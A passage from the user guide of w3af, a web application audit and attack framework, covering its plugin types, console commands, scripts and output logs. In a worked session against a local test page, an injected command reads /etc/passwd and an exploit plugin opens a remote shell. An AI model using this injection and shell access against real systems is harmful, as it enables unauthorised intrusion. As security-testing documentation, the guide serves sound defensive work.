class="P10">Utidy and it's requirements should be downloaded and installed following the procedures specified by that project. If you are using a Debian based distribution, you can run “apt-get install python-utidylib” and you are done. </p><p class="P9"> </p><h2 class="P28"><a name="w3af_phases" />w3af phases</h2><p class="P9"> </p><p class="P10">Before even running w3af a user must know how the application is divided, and how plugins are going to be executed. Basically, w3af has three types of plugins: discovery , audit and attack. </p><p class="P10"><span class="T1">Discovery plugins</span> have only one responsibility, finding new URLs, forms, and other “injection points”. A classic example of a discovery plugin is a web spider. This plugin takes a URL as input and returns one or more injection points. When a user enables more than one plugin of this type, they work recursively: If plugin A finds a new URL in the first run, the w3af core will send that URL to plugin B. If plugin B then finds a new URL, it will be sent to plugin A. This will go on until all plugins are run and no more knowledge about the application can be found using the enabled discovery plugins.</p><p class="P10"><span class="T1">Audit plugins</span> take the injection points found by discovery plugins and send specially crafted data to all of them in order to find vulnerabilities. A classic example of an audit plugin is one that searches for SQL injection.</p><p class="P12">Attack plugins <span class="T2">objective is to exploit vulnerabilities found by audit plugins. They usually return a shell on the remote server, or a dump of remote databases in case of SQL injections.</span></p><p class="P13"> </p><h2 class="P29"><a name="Running_w3af" />Running w3af</h2><p class="P13"> </p><p class="P14">w3af has two user interfaces, the consoleUI and the webUI. This user guide will focus on the consoleUI, which is, at the moment of this writing much more tested and complete than the webUI. To fire up the consoleUI you just have to execute w3af without parameters and you will get a prompt like this one: </p><p class="P40"><span class="T3">$</span> ./w3af</p><p class="P41">w3af&gt;&gt;&gt; </p><p class="P40"> </p><p class="P17">From this prompt you will be able to configure the framework, launch scans and ultimately exploit a vulnerability. At this point you can start typing commands, the first command you have to learn is “help” (Please note that commands are case sensitive) . </p><p class="P16"> </p><p class="P40"><span class="T3">w3af&gt;&gt;&gt;</span> help</p><p class="P40">The following commands are available: </p><p class="P40">help                You are here. help [command] prints more specific help.</p><p class="P40">url-settings        Configure the URL opener.</p><p class="P40">misc-settings       Configure w3af misc settings.</p><p class="P40">session             Load and save sessions.</p><p class="P40">plugins             Enable, disable and configure plugins.</p><p class="P40">start               Start site analysis.</p><p class="P40">exploit             Exploit a vulnerability.</p><p class="P40">tools               Enter the tools section.</p><p class="P40">target              Set the target URL.</p><p class="P40">exit                Exit w3af.</p><p class="P41">w3af&gt;&gt;&gt; </p><p class="P40"><span class="T3">w3af&gt;&gt;&gt;</span> help target</p><p class="P40">Enter the target configuration. Here you will configure the target URL. </p><p class="P41">w3af&gt;&gt;&gt; </p><p class="P41"> </p><p class="P17">The main menu commands are explained in the help that is displayed above. The internals of every menu will be seen later in this document. As you already noticed, the “help” command can take a parameter, and if available, a detailed help for that parameter will be shown, <span class="T8">e.g. “help tools”.</span></p><p class="P17">Other interesting things to notice about the consoleUI are the tab completion (type 'plu' and then TAB) and the command history ( after typing some commands, navigate the history with the up and down arrows ). </p><p class="P17">To enter a configuration menu, you just have to type it's name and hit enter, you will see how the prompt changes and you are now in that context. </p><p class="P40"><span class="T3">w3af&gt;&gt;&gt;</span> url-settings</p><p class="P41">w3af/url-settings&gt;&gt;&gt; </p><p class="P16"> </p><p class="P16">All the configuration menus provide the following commands: </p><ul style="margin-left:1.25cm;"><li class="P95" style="margin-left:0cm;"><p class="P95" style="margin-left:0.25cm;">help </p></li><li class="P95" style="margin-left:0cm;"><p class="P95" style="margin-left:0.25cm;">view </p></li><li class="P95" style="margin-left:0cm;"><p class="P95" style="margin-left:0.25cm;">set </p></li><li class="P95" style="margin-left:0cm;"><p class="P95" style="margin-left:0.25cm;">back </p></li></ul><p class="P16"> </p><p class="P16">Here is a usage example of this commands in the url-settings menu: </p><p class="P16"> </p><p class="P40"><span class="T3">w3af/url-settings&gt;&gt;&gt;</span> help</p><p class="P40">The following commands are available: </p><p class="P40">help                You are here. help [command|parameter] prints more specific help.</p><p class="P40">set                 Set a parameter value.</p><p class="P40">view                List all configuration parameters and current values.</p><p class="P40">back                Return to previous menu.</p><p class="P40"><span class="T3">w3af/url-settings&gt;&gt;&gt;</span> view</p><p class="P40">Parameter           Value               Description</p><p class="P40">=========           =====               ===========</p><p class="P40">proxyPort           8080                Proxy TCP port</p><p class="P40">basicAuthDomain                         Set the basic authentication domain for HTTP requests</p><p class="P40">maxFileSize         400000              Indicates the maximum file size (in bytes) that w3af will GET/POST.</p><p class="P40">headersFile                             Set the headers filename. This file has additional headers that are added to each request.</p><p class="P40">proxyAddress                            Proxy IP address</p><p class="P40">maxRetrys           2                   Indicates the maximum number of retries when requesting an URL.</p><p class="P40">ignoreSessCookies   False               Ignore session cookies</p><p class="P40">timeout             10                  The timeout for connections to the HTTP server</p><p class="P40">basicAuthUser                           Set the basic authentication username for HTTP requests</p><p class="P40">userAgent           w3af.sourceforge.netUser Agent header</p><p class="P40">basicAuthPass                           Set the basic authentication password for HTTP requests</p><p class="P40">cookieJarFile                           Set the cookiejar filename.</p><p class="P40"><span class="T3">w3af/url-settings&gt;&gt;&gt;</span> set timeout 5</p><p class="P40"><span class="T3">w3af/url-settings&gt;&gt;&gt;</span> view</p><p class="P40">... </p><p class="P40">timeout             5                   The timeout for </p><p class="P40">connections to the HTTP server </p><p class="P40">... </p><p class="P40"> </p><p class="P17">To summarize, the “view” command is used to list all parameters, with their values and a description. The set command is used to change the value of a variable. Finally we can execute “back” or press CTRL+C and you will return to the previous menu. A detailed help for every configuration parameter can be obtained using “help parameter” like shown in this example: </p><p class="P25"> </p><p class="P40"><span class="T3">w3af/url-settings&gt;&gt;&gt;</span> help timeout</p><p class="P40">Help for parameter timeout: </p><p class="P40">=========================== </p><p class="P40">Set low timeouts for LAN use and high timeouts for slow Internet connections. </p><p class="P41">w3af/url-settings&gt;&gt;&gt; </p><p class="P18"> </p><p class="P20">The “url-settings” and the “misc-settings” configuration menus are used to set system wide parameters that are used by the framework. All the parameters have defaults and in most cases you can leave them as they are. w3af was designed in a way that allows beginners to run it without having to learn a lot of its internals, and also flexible enough to be tunned by experts that know what they want and need to change internal configuration parameters to fulfill their task. </p><p class="P19"> </p><h3 class="P8"><a name="Plugins" />Plugins</h3><p class="Textbody"> </p><p class="P36">Plugins do all the magic. The plugins will find the URLs, discover the bugs and exploit them. So now, we will learn how to configure the plugins. In a previous section I told you that w3af had three types of plugins: discovery, audit and exploit. Well, I actually lied a little because w3af has many other plugins. The complete list of plugins types is: </p><p class="Textbody"> </p><ul style="margin-left:1.25cm;"><li class="P56" style="margin-left:0cm;"><p class="P56" style="margin-left:0.25cm;">discovery </p></li><li class="P56" style="margin-left:0cm;"><p class="P56" style="margin-left:0.25cm;">audit </p></li><li class="P56" style="margin-left:0cm;"><p class="P56" style="margin-left:0.25cm;">grep </p></li><li class="P56" style="margin-left:0cm;"><p class="P56" style="margin-left:0.25cm;">exploit </p></li><li class="P56" style="margin-left:0cm;"><p class="P56" style="margin-left:0.25cm;">output </p></li><li class="P56" style="margin-left:0cm;"><p class="P56" style="margin-left:0.25cm;">mangle </p></li><li class="P56" style="margin-left:0cm;"><p class="P56" style="margin-left:0.25cm;">bruteforce </p></li><li class="P56" style="margin-left:0cm;"><p class="P56" style="margin-left:0.25cm;">evasion </p></li></ul><p class="Textbody"> </p><p class="P36">As said before, discovery plugins find new points of injection, that are later used by audit plugins to find vulnerabilities. Grep plugins analyze all page content and find vulnerabilities on pages that are requested by other plugins; for example a grep plugin will find a comment on the HTML body that has the word “password” inside it  and generate a vulnerability based on it.</p><p class="P36">Exploit plugins [ab]use the vulnerabilities found in the audit phase and return something useful to the user ( remote shell, SQL table dump, a proxy, etc ). </p><p class="P36">Output plugins are the way the framework and the plugins communicate with the user, output plugins save the data to a text or html file. Debugging information is also sent to the plugins and can be saved for analysis. </p><p class="P36">Mangle plugins are a way to modify requests and responses based on regular expressions, think “sed (stream editor) for the web”. </p><p class="P36">Bruteforce plugins will bruteforce logins, they are actually part of the discovery phase.  </p><p class="P36">Finally, evasion plugins try to evade simple intrusion detection rules. </p><h3 class="Heading3"><a name="Plugin_configuration" />Plugin configuration</h3><p class="P36">The plugins are configured using the “plugins” configuration menu. Lets see how to do that: </p><p class="Textbody"> </p><p class="P39"><span class="T3">w3af&gt;&gt;&gt;</span> plugins</p><p class="P39"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> help</p><p class="P39">The following commands are available: </p><p class="P39">help                You are here. help [command] prints more specific help.</p><p class="P39">list                List all available plugins.</p><p class="P39">audit               Enable and configure audit plugins.</p><p class="P39">output              Enable and configure output plugins.</p><p class="P39">discovery           Enable and configure discovery plugins.</p><p class="P39">grep                Enable and configure grep plugins.</p><p class="P39">evasion             Enable and configure evasion plugins.</p><p class="P39">mangle              Enable and configure mangle plugins.</p><p class="P39">bruteforce          Enable and configure bruteforce plugins.</p><p class="P39">back                Return to previous menu.</p><p class="P42">w3af&gt;&gt;&gt; </p><p class="P26"> </p><p class="P22">As you may have noticed, all plugins can be configured here except the exploit plugins, we will talk about them later. The first step to take here is to know the syntax for configuring the plugins, so lets do that: </p><p class="P21"> </p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> help audit</p><p class="P44">Enable and configure audit plugins. </p><p class="P44">Syntax: audit [config plugin1] [plugin1,plugin2 ... pluginN] </p><p class="P44">Example: audit </p><p class="P44">Result: All enabled audit plugins are listed. </p><p class="P44">Example2: audit plugin1,plugin2 </p><p class="P44">Result: plugin1 and plugin2 are configured to run </p><p class="P44">Example3: audit config plugin1 </p><p class="P44">Result: Enters to the plugin configuration menu. </p><p class="P44">Example4: audit all,!plugin3 </p><p class="P44">Result: All audit plugins are configured to run except plugin3. </p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> help list</p><p class="P44">List all available plugins. </p><p class="P44">Sintax: list {plugin type}</p><p class="P44">Example: list audit </p><p class="P42">w3af/plugins&gt;&gt;&gt; </p><p class="P42"> </p><p class="P22">Ok, so w3af is nice enough to tell us how to use it. Now we will see how to enable two plugins and then verify that they are enabled: </p><p class="P21"> </p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit xss, sqli</p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit</p><p class="P44">Enabled audit plugins: </p><p class="P44">xss </p><p class="P44">sqli </p><p class="P42">w3af/plugins&gt;&gt;&gt; </p><p class="P21"> </p><p class="P22">By issuing the <span class="T4">“audit xss, sqli”</span> command we enable the <span class="T4">“xss”</span> and <span class="T4">“sqli”</span> plugins to be runned. To see what these plugin do, we could have ran the <span class="T4">“list”</span> command like this to get a small description of all plugins:</p><p class="P21"> </p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> list audit</p><p class="P44">mxInjection         This plugin tests for MX injection bugs.</p><p class="P44">unSSL               This plugin checks if secure content can also be fetched using http.</p><p class="P44">fileUpload          This plugin uploads a file and then searches for the file inside all known directories.</p><p class="P44">xpath               This plugin tests for XPATH injection bugs.</p><p class="P44">sslCertificate      This plugin checks the SSL certificate validity( if https is being used ).</p><p class="P44">htaccessMethods     This plugin searches for misconfigurations in the "&lt;LIMIT&gt;" configuration of Apache.</p><p class="P44">LDAPi               This plugin tests for LDAP injection bugs.</p><p class="P44">osCommanding        This plugin tests for OS Commanding bugs.</p><p class="P44">responseSplitting   This plugin tests for response splitting bugs.</p><p class="P44">blindSqli           This plugin tests for blind SQL injection bugs.</p><p class="P44">sqli                This plugin tests for SQL injection bugs.</p><p class="P44">remoteFileInclude   This plugin tests for remote file inclusion bugs.</p><p class="P44">formatString        This plugin tests for format String bugs.</p><p class="P44">localFileInclude    This plugin tests for local file inclusion bugs.</p><p class="P44">xss                 This plugin tests for XSS.</p><p class="P44">ssi                 This plugin tests for server side inclusion bugs.</p><p class="P44">buffOverflow        This plugin tests for buffer overflow bugs.</p><p class="P44">globalRedirect      This plugin tests for scripts that redirect the browser to any site.</p><p class="P44">xsrf                This plugin tests for the easiest to exploit xsrf vulnerabilities.</p><p class="P44">phishingVector      This plugin searches for phishing vectors.</p><p class="P44">dav                 This plugin uploads a file and then searches for the file inside all known directories.</p><p class="P44">preg_replace        This plugin tests for unsafe usage of PHPs preg_replace.</p><p class="P42">w3af/plugins&gt;&gt;&gt; </p><p class="P21"> </p><p class="P30">Or if the user is interested in knowing exactly what a plugin does, he can also run the “<span class="T5">desc” </span>command like this:</p><p class="P21"> </p><p class="P44"><span class="T3">w3af&gt;&gt;&gt;</span> plugins</p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit desc fileUpload</p><p class="P44"> </p><p class="P44">This plugin will try to expoit insecure file upload forms. </p><p class="P44"> </p><p class="P51">               One configurable parameter exists:</p><p class="P51">                        - extensions</p><p class="P44"> </p><p class="P44">The extensions parameter is a comma separated list of extensions that this plugin will try to upload. Many web applications              verify the extension of the file being uploaded, if special extensions are required, they can be added here.</p><p class="P27" /><p class="P44">Some web applications check the contents of the files being uploaded to see if they are really what their extension                is telling. To bypass this check, this plugin uses file templates located at "plugins/audit/fileUpload/", this templates</p><p class="P44">are valid files for each extension that have a section ( the comment field in a gif file for example ) that can be replaced </p><p class="P27">     by scripting code ( PHP, ASP, etc ).</p><p class="P27"> </p><p class="P44">After uploading the file, this plugin will try to find it on common directories like "upload" and "files" on every know directory. If the file is found, a vulnerability exists. </p><p class="P44"> </p><p class="P42">w3af/plugins&gt;&gt;&gt; </p><p class="P21"> </p><p class="P22">Now we know what this plugin does, but let's check their internals: </p><p class="P21"> </p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit config xss</p><p class="P44"><span class="T3">w3af/plugin/xss&gt;&gt;&gt; </span>view</p><p class="P44">Parameter           Value               Description</p><p class="P44">=========           =====               ===========</p><p class="P44">checkPersistent     True                Search persistent XSS</p><p class="P44"><span class="T3">w3af/plugin/xss&gt;&gt;&gt; </span>set checkPersistent False</p><p class="P44"><span class="T3">w3af/plugin/xss&gt;&gt;&gt;</span> back</p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit config sqli</p><p class="P44"><span class="T3">w3af/plugin/sqli&gt;&gt;&gt; </span>view</p><p class="P44">No configurable parameters. </p><p class="P44"><span class="T3">w3af/plugin/sqli&gt;&gt;&gt; </span>back</p><p class="P42">w3af/plugins&gt;&gt;&gt; </p><p class="P21"> </p><p class="P22">The configuration menus for the plugins also have the set command for changing the parameters values, and the view command for listing existing values. On the previous example we disabled persistent cross site scripting checks in the xss plugin, and listed the options of the sqli plugin ( it actually has no configurable parameters ). </p><p class="P21"> </p><h2 class="Heading2"><a name="Starting_a_scan" />Starting a scan</h2><p class="P21"> </p><p class="P22">After configuring all desired plugins the user has to set the target URL and finally start the scan. The target selection is done this way: </p><p class="P21"> </p><p class="P44"><span class="T3">w3af&gt;&gt;&gt;</span> target</p><p class="P44"><span class="T3">w3af/target&gt;&gt;&gt; </span>set target http://localhost/</p><p class="P44"><span class="T3">w3af/target&gt;&gt;&gt;</span> back</p><p class="P42">w3af&gt;&gt;&gt; </p><p class="P26"> </p><p class="P21">Finally, you execute “start” and the process will start all plugins. </p><p class="P21"> </p><p class="P44"><span class="T3">w3af&gt;&gt;&gt;</span> start</p><p class="P21"> </p><h3 class="Heading3"><a name="A_complete_session" />A complete session</h3><p class="P21"> </p><p class="P22">A complete w3af session would look like this ( see the inline comments ): </p><p class="P21"> </p><p class="P44"><span class="T3">$</span> ./w3af</p><p class="P44"><span class="T3">w3af&gt;&gt;&gt;</span> plugins</p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output console,textFile</p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output</p><p class="P44">Enabled output plugins: </p><p class="P44">textFile </p><p class="P44">console </p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output config textFile</p><p class="P44"><span class="T3">w3af/plugin/textFile&gt;&gt;&gt;</span> set fileName output-w3af.txt</p><p class="P44"><span class="T3">w3af/plugin/textFile&gt;&gt;&gt;</span> set verbosity 10</p><p class="P44"><span class="T3">w3af/plugin/textFile&gt;&gt;&gt;</span> back</p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output config console</p><p class="P44"><span class="T3">w3af/plugin/console&gt;&gt;&gt;</span> set verbosity 0</p><p class="P44"><span class="T3">w3af/plugin/console&gt;&gt;&gt;</span> back</p><p class="P21" /><p class="P22">All this previous commands have enabled two output plugins, console and textFile and configured them as needed. </p><p class="P21"> </p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> discovery allowedMethods,webSpider,error404page</p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> discovery</p><p class="P44">Enabled discovery plugins: </p><p class="P44">webSpider </p><p class="P44">allowedMethods </p><p class="P44">error404page </p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> back</p><p class="P44"> </p><p class="P22">In this case, we will be running only discovery plugins. The enabled plugins are allowedMethods,webSpider,error404page . </p><p class="P44"> </p><p class="P44"><span class="T3">w3af&gt;&gt;&gt;</span> target</p><p class="P44"><span class="T3">w3af/target&gt;&gt;&gt;</span>set target http://localhost/w3af/</p><p class="P44"><span class="T3">w3af/target&gt;&gt;&gt;</span>back</p><p class="P44"><span class="T3">w3af&gt;&gt;&gt;</span> start</p><p class="P44">New URL found by discovery: http://localhost/w3af/responseSplitting/responseSplitting.php </p><p class="P44">New URL found by discovery: http://localhost/w3af/blindSqli/blindSqli-str.php </p><p class="P44">New URL found by discovery: http://localhost/w3af/webSpider/2.html </p><p class="P44">... </p><p class="P44">... </p><p class="P44">The URL: http://localhost/beef/hook/ has DAV methods enabled: </p><p class="P44">- OPTIONS </p><p class="P44">- GET </p><p class="P44">- HEAD </p><p class="P44">- POST </p><p class="P44">- TRACE </p><p class="P44">- PROPFIND</p><p class="P44">- PROPPATCH </p><p class="P44">- COPY </p><p class="P44">- MOVE </p><p class="P44">- LOCK </p><p class="P44">- UNLOCK </p><p class="P44">- DELETE ( is possibly enabled too, not tested for safety ) </p><p class="P44">New URL found by discovery: http://localhost/w3af/globalRedirect/wargame/ </p><p class="P44">New URL found by discovery: http://localhost/w3af/globalRedirect/w3af-site.tgz </p><p class="P44"> </p><p class="P22">After the discovery phase is finished a summary is presented to the user: </p><p class="P44"> </p><p class="P44">The list of found URLs is: </p><p class="P44">- http://localhost/w3af/globalRedirect/w3af.testsite.tgz </p><p class="P44">- http://localhost/beef/hook/beefmagic.js.php </p><p class="P44">- http://localhost/w3af/globalRedirect/2.php </p><ul style="margin-left:0.5cm;"><li class="P85" style="margin-left:1.25cm;"><p class="P85" style="margin-left:0.25cm;">http://localhost/w3af/webSpider/11.html </p><p class="P85" style="margin-left:0.25cm;">... </p><p class="P85" style="margin-left:0.25cm;">... </p></li></ul><p class="P27"> </p><p class="P22">A section of the summary is the points of injection that will be used in the audit phase: </p><p class="P27"> </p><p class="P44">Found 78 URLs and 102 different points of injection. </p><p class="P44">The list of Fuzzable requests is: </p><p class="P44">- http://localhost/w3af/ | Method: GET </p><p class="P44">- http://localhost/w3af/responseSplitting/responseSplitting.php | Method: GET | Parameters: (header) </p><ul style="margin-left:0.5cm;"><li class="P88" style="margin-left:1.25cm;"><p class="P88" style="margin-left:0.25cm;">http://localhost/w3af/sqli/dataReceptor.php | Method: POST | Parameters: (user,firstname) </p></li></ul><p class="P22">Finally the user exits the application, returning to the shell. </p><p class="P21"> </p><p class="P44"><span class="T3">w3af&gt;&gt;&gt;</span> exit</p><p class="P44">w3af, better than the regular script kiddie. </p><p class="P42">$ </p><p class="P27"> </p><h2 class="Heading2"><a name="A_warning_about_discovery" />A warning about discovery</h2><p class="Textbody"> </p><p class="Textbody">The discovery phase is a double edged sword: use it with wisdom, and it will give you a lot of knowledge about the remote web application, use it in a greedy way and you will be waiting for hours until the discovery phase ends. Just to make things clear, the greedy way is to enable all discovery plugins ( “discovery all” ) without even knowing what you are doing or having manually browsed the web and understood the internals.  </p><p class="Textbody">Some examples will make things clear:  </p><ul style="margin-left:1.25cm;"><li class="P64" style="margin-left:0cm;"><p class="P64" style="margin-left:0.25cm;">“You are testing an intranet web application, the web application is huge and doesn't use any macromedia flash or javascript code”.  </p><p class="P64" style="margin-left:0.25cm;"><span class="T1">Recommendation :</span> “discovery all,!spiderMan, !fingerGoogle, !fingerMSN, !fingerPKS, !MSNSpider, !googleSpider, !phishtank, !googleSafeBrowsing”.</p><p class="P66" style="margin-left:0.25cm;">Reason: <span class="T2">Spiderman should only be used when webSpider can't find some links. The fingerGoogle, fingerMSN and fingerPKS plugins discover mail addresses from search engines, if this is an intranet application, the addresses put in this site wont be available in search engines because they never were indexed. MSNSpider and googleSpider find URLs using search engines, like the ones before, they are useless because search engines don't index private pages. phishtank and googleSafeBrowsing should be enabled because they search for phishing sites, and like the ones before them, private sites aren't indexed in this systems.</span></p><p class="P70" style="margin-left:0.25cm;"> </p></li><li class="P70" style="margin-left:0cm;"><p class="P70" style="margin-left:0.25cm;">“You are testing a web application over the internet, the web application is huge and doesn't use any macromedia flash or javascript code”.  </p><p class="P70" style="margin-left:0.25cm;"><span class="T1">Recommendation</span> : “discovery all,!spiderMan, !wordnet , !googleSets”.</p><p class="P66" style="margin-left:0.25cm;">Reason: <span class="T2">Spiderman should only be used when webSpider can't find some links. The wordnet and googleSets plugins are two plugins that take a long time to run over the internet so it's a good idea to disable them.</span></p><p class="P70" style="margin-left:0.25cm;"> </p></li><li class="P70" style="margin-left:0cm;"><p class="P70" style="margin-left:0.25cm;">“You are testing a web application over the internet, the web application is huge and has macromedia flash or javascript code. You also know that the application doesn't implement any web services”.  </p><p class="P70" style="margin-left:0.25cm;"><span class="T1">Recommendation</span> : “discovery all, !wordnet , !googleSets, !wsdlFinder”.</p><p class="P66" style="margin-left:0.25cm;">Reason: <span class="T2">The wordnet and googleSets plugins are two plugins that take a </span><span class="T2">long time to run over the internet so it's a good idea to disable them. Regarding wsdlFinder, if we already know that no web services exist, why look for them using it ? .</span></p><p class="P70" style="margin-left:0.25cm;"> </p></li><li class="P70" style="margin-left:0cm;"><p class="P70" style="margin-left:0.25cm;">“You are testing a web application over the internet, the web application is huge, you really need to know all the links and functionality of the site and you don't care waiting.”.  </p><p class="P70" style="margin-left:0.25cm;"><span class="T1">Recommendation</span> : “discovery all” .</p><p class="P66" style="margin-left:0.25cm;">Reason: <span class="T2">You really need to get a lot of knowledge about the site and don't care if it takes a complete day.</span></p></li></ul><h3 class="Heading3"><a name="When_everything_else_fails..." />When everything else fails...</h3><p class="P37">So, you enabled only the recommended plugins in the discovery phase, you started the framework one hour ago, the discovery is still running and doesn't find anything. When you find yourself in this situation you have two options, waiting for w3af to finish or hitting ctrl+c to finish the discovery and start with the audit phase. </p><p class="P37">You should also remember that if you are saving the debug information to a text file you can open a new terminal and run a “tail -f w3af-output-file.txt” to see what w3af is really doing. </p><h2 class="Heading2"><a name="w3af_scripts" />w3af scripts</h2><p class="Textbody"> </p><p class="P36">While developing w3af, I realized that I needed a fast way to execute the same steps over and over, so the script functionality was born. w3af can run a script file using the “-s” argument. Script files are text files with one command on each line. An example script file would look like this: </p><p class="Textbody"> </p><p class="P39"><span class="T3">$</span> head scripts/script-osCommanding.w3af</p><p class="P39"># This is the osCommanding demo: </p><p class="P39"> </p><p class="P39">plugins </p><p class="P39">output console,textFile </p><p class="P39">output </p><p class="P39">output config textFile </p><p class="P39">set fileName output-w3af.txt </p><p class="P39">set verbosity 10 </p><p class="P39">back </p><p class="P39" /><p class="P23">To run this script you would execute <span class="T4">“./w3af -s scripts/script-osCommanding.w3af” </span>,  the output would look just like if you typed every command by hand in the console:</p><p class="P15"> </p><p class="P39"><span class="T3">$</span> ./w3af -s scripts/script-osCommanding.w3af</p><p class="P39"><span class="T3">w3af&gt;&gt;&gt;</span> plugins</p><p class="P39"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit osCommanding</p><p class="P39"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit</p><p class="P39">Enabled audit plugins: </p><p class="P39">osCommanding </p><p class="P39"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> back</p><p class="P39"><span class="T3">w3af&gt;&gt;&gt;</span> target</p><p class="P39"><span class="T3">w3af/target&gt;&gt;&gt;</span> set target http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9</p><p class="P39"><span class="T3">w3af/target&gt;&gt;&gt;</span> back</p><p class="P39"><span class="T3">w3af&gt;&gt;&gt;</span> start</p><p class="P39">The list of found URLs is: </p><p class="P39">- http://localhost/w3af/osCommanding/vulnerable.php </p><p class="P39">Found 1 URLs and 1 different points of injection. </p><p class="P39">The list of Fuzzable requests is: </p><p class="P39">- http://localhost/w3af/osCommanding/vulnerable.php | Method: GET | Parameters: (command) </p><p class="P39">Starting osCommanding plugin execution. </p><p class="P39">OS Commanding was found at: http://localhost/w3af/osCommanding/vulnerable.php . Using method: GET. The data sent was: command=%2Fbin%2Fcat+%2Fetc%2Fpasswd The vulnerability was found in the request with id 2. </p><p class="P39"><span class="T3">w3af&gt;&gt;&gt;</span> exploit</p><p class="P39"><span class="T3">w3af/exploit&gt;&gt;&gt;</span> exploit osCommandingShell</p><p class="P39">osCommanding exploit plugin is starting. </p><p class="P39">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed. </p><p class="P39">Vulnerability successfully exploited. </p><p class="P39">Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server.</p><p class="P39"><span class="T3">w3af/exploit/osCommandingShell&gt;&gt;&gt;</span> ls</p><p class="P39">vulnerable.php </p><p class="P39">vulnerable.php~ </p><p class="P42">w3af/exploit/osCommandingShell&gt;&gt;&gt; </p><p class="P42">w3af/exploit&gt;&gt;&gt; </p><p class="P42">w3af&gt;&gt;&gt; </p><p class="P39">Be a good boy and contribute with some lines of code. </p><p class="P42">$ </p><p class="P42"> </p><h2 class="Heading2"><a name="The_Output" />The Output</h2><p class="Textbody"> </p><p class="P36">All the output of w3af is managed by the output plugins. Each output plugin will write in a different format ( txt, html, etc ), for example the textFile plugin writes all output to the output-w3af.txt file by default. The configuration of this plugins is done just like other plugins, as seen before: </p><p class="Textbody"> </p><p class="P44"><span class="T3">$</span> ./w3af</p><p class="P44"><span class="T3">w3af&gt;&gt;&gt;</span> plugins</p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output console,textFile</p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output</p><p class="P44">Enabled output plugins: </p><p class="P44">textFile </p><p class="P44">console </p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output config textFile</p><p class="P44"><span class="T3">w3af/plugin/textFile&gt;&gt;&gt;</span> set fileName output-w3af.txt</p><p class="P44"><span class="T3">w3af/plugin/textFile&gt;&gt;&gt;</span> set verbosity 10</p><p class="P44"><span class="T3">w3af/plugin/textFile&gt;&gt;&gt;</span> back</p><p class="P44"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output config console</p><p class="P44"><span class="T3">w3af/plugin/console&gt;&gt;&gt;</span> set verbosity 0</p><p class="P44"><span class="T3">w3af/plugin/console&gt;&gt;&gt;</span> back</p><p class="Textbody"> </p><p class="P36">This will configure the textFile plugin to output all messages, including the debugging information ( see “<span class="T5">set verbosity 10” </span><span class="T7">) to the </span><span class="T5">“output-w3af.txt” </span><span class="T7">file. Here is an example of what is written to this file:</span></p><p class="P38"> </p><p class="P44">[ Tue May 15 14:14:49 2007 - debug ] Called _audit() </p><p class="P44">[ Tue May 15 14:14:49 2007 - information ] Starting osCommanding plugin execution. </p><p class="P44">[ Tue May 15 14:14:49 2007 - debug ] osCommanding plugin is testing: http://localhost/w3af/osCommanding/vulnerable.php </p><p class="P44">[ Tue May 15 14:14:49 2007 - debug ] Threading is disabled. </p><p class="P44">[ Tue May 15 14:14:49 2007 - debug ] GET http://localhost/w3af/osCommanding/vulnerable.php?command=%2Fbin%2Fcat+%2Fetc%2Fpasswd returned HTTP code "200" </p><p class="P44">[ Tue May 15 14:14:49 2007 - debug ] Found the file echoed by the command. </p><p class="P44">[ Tue May 15 14:14:49 2007 - vulnerability ] OS Commanding was found at: http://localhost/w3af/osCommanding/vulnerable.php . Using method: GET. The data se </p><p class="P44">[ Tue May 15 14:14:49 2007 - debug ] Written session to disk. This is done only after 5 calls to save(). </p><p class="P44"> </p><p class="P22">Output plugins also handle the logging of HTTP requests and responses, every plugin handles this data in a different way, for example, the textFile plugin writes requests and responses to a file, while the htmlFile plugin disregards the data and simply does nothing with it. An example of a HTTP log written by the textFile follows: </p><p class="P21"> </p><p class="P44">======Request 5 - Tue May 15 14:14:49 2007====== </p><p class="P44">GET http://localhost/w3af/osCommanding/vulnerable.php?command=ls HTTP/1.1 </p><p class="P44">Host: localhost </p><p class="P44">Accept-encoding: identity </p><p class="P44">Accept: */* </p><p class="P44">User-agent: w3af.sourceforge.net </p><p class="P44"> </p><p class="P44"> </p><p class="P44"> </p><p class="P44">======Response 5 - Tue May 15 14:14:49 2007====== </p><p class="P44">HTTP/1.1 200 OK</p><p class="P44">date: Tue, 15 May 2007 17:14:49 GMT </p><p class="P44">transfer-encoding: chunked </p><p class="P44">x-powered-by: PHP/5.2.0-10 </p><p class="P44">content-type: text/html; charset=UTF-8 </p><p class="P44">server: Apache/2.2.3 (Debian) mod_python/3.2.10 Python/2.4.4 PHP/5.2.0-10 mod_perl/2.0.2 Perl/v5.8.8 </p><p class="P44"> </p><p class="P44"> </p><p class="P44">asdljasndlansdlaknsdlaknsd </p><p class="P44">vulnerable.php </p><p class="P44">vulnerable.php~ </p><p class="P44"> </p><p class="P44">asdajlsdkjalsdkj </p><p class="P44"> </p><p class="P44">====== </p><p class="P44"> </p><p class="P22">Just in case you are wondering, all messages sent by the plugins and the framework are sent to ALL enabled plugins, so if you have 